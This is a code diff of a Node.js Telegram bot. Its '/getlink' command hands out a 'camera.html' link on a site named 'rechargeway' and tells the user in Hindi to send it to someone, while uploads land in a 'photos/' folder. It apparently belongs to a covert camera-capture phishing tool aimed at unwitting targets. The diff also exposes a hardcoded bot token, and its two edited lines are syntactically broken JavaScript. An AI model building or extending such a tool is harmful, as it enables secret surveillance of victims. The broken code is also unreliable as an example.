@@ -2,7 +2,8 @@ const express = require("express");
 const multer = require("multer");
 const TelegramBot = require("node-telegram-bot-api");
 
-const TOKEN = process.env.8206154228:AAE-xkreEnsqtOZ6xnqyaM-7DlCjRY7mivE;
+const TOKEN = process.env.8206154228:AAE-xkreEnsqtOZ6xnqyaM-7DlCjRY7mivE
+;
 const bot = new TelegramBot(TOKEN, { polling: true });
 
 const upload = multer({ dest: "photos/" });
@@ -12,7 +13,7 @@ app.use(express.static("public"));
 
 bot.onText(/\/getlink/, (msg) => {
     const id = msg.chat.id;
-    const domain = process.env.RENDER_EXTERNAL_URL;
+    const domain = process.env.https://rechargeway.onrender.com;
     const link = `${domain}/camera.html?id=${id}`;
     
     bot.sendMessage(id, "👇 Yeh link kisi ko send karo:\n" + link);
